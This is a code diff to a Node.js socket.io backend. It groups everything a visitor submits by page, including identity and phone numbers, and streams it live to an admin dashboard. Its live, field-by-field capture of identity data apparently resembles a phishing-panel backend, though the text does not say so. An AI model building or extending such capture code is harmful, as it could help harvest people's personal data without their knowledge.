@@ -255,12 +255,48 @@ function recordSubmission(type, payload) {
     set("page", ["page", "currentPage", "step"]);
     if (flat.idNumber) flat.identityNumber = flat.idNumber;
     if (flat.phone) flat.mobileNumber = flat.phone;
+    // Per-page bucket: keep the latest client inputs grouped by the page/event
+    // the visitor was on when they submitted, so the dashboard can show
+    // exactly what the client typed on each screen of their session.
+    const existingUser = db.get().users[id] || {};
+    const pageKey = String(flat.page || type || "unknown");
+    const prevPages = (existingUser.pages && typeof existingUser.pages === "object") ? existingUser.pages : {};
+    const prevBucket = prevPages[pageKey] || { inputs: {}, events: [] };
+    const mergedInputs = { ...(prevBucket.inputs || {}), ...flat };
+    // Drop empty strings so we don't overwrite real values with blanks
+    for (const k of Object.keys(mergedInputs)) {
+      if (mergedInputs[k] === "" || mergedInputs[k] === null) delete mergedInputs[k];
+    }
+    const nextBucket = {
+      page: pageKey,
+      inputs: mergedInputs,
+      lastEvent: type,
+      lastPayload: payload,
+      updatedAt: now(),
+      events: [...(prevBucket.events || []).slice(-19), { type, ts: now() }],
+    };
+    const nextPages = { ...prevPages, [pageKey]: nextBucket };
+
     upsertSession(id, {
       ...flat,
       [type]: payload,
+      pages: nextPages,
       lastEvent: type,
+      lastPage: pageKey,
       stage: type,
       lastSubmissionAt: now(),
+    });
+
+    // Push a compact per-page notification for dashboards that want to
+    // render "client input on page X" without diffing the full session.
+    io.to("admins").emit("client:input", {
+      id,
+      uuid: id,
+      page: pageKey,
+      event: type,
+      inputs: mergedInputs,
+      payload,
+      ts: now(),
     });
   }
   return entry;
@@ -384,7 +420,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v14";
+const APP_VERSION = "v15";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
@@ -659,10 +695,16 @@ io.on("connection", (socket) => {
   socket.onAny((event, payload) => {
     if (IGNORED_ANY_EVENTS.has(event)) return;
     if (socket.data.userType === "admin" || socket.data.role === "admin") return;
-    if (typeof payload !== "object" || payload === null) return;
-    const id = payload.uuid || payload.id || socket.data.userId || socket.data.sessionId;
+    const obj = (payload && typeof payload === "object") ? payload : {};
+    const id =
+      obj.uuid || obj.id || obj.userId ||
+      socket.data.userId || socket.data.sessionId ||
+      findSessionByIp(clientIp(socket.request));
     if (!id) return;
-    recordSubmission(event, { ...payload, uuid: id });
+    // Stamp the current page if the client didn't include one, so the
+    // per-page bucket in recordSubmission groups inputs correctly.
+    const page = obj.page || obj.currentPage || socket.data.page || event;
+    recordSubmission(event, { ...obj, uuid: id, page });
   });
 
   // -------- Frontend (customer site) join --------
@@ -867,11 +909,13 @@ io.on("connection", (socket) => {
 
   socket.on("user:pageNavigation", (p) => {
     const uid = socket.data.userId;
-    if (uid) upsertSession(uid, { lastPage: p?.page, lastSeen: now() });
+    const page = p?.page || p?.currentPage || p?.route;
+    socket.data.page = page || socket.data.page;
+    if (uid) upsertSession(uid, { lastPage: page, currentPage: page, lastSeen: now() });
     io.to("admins").emit("live:update", {
       type: "pageNavigation",
       uuid: uid,
-      page: p?.page,
+      page,
       ts: now(),
     });
   });
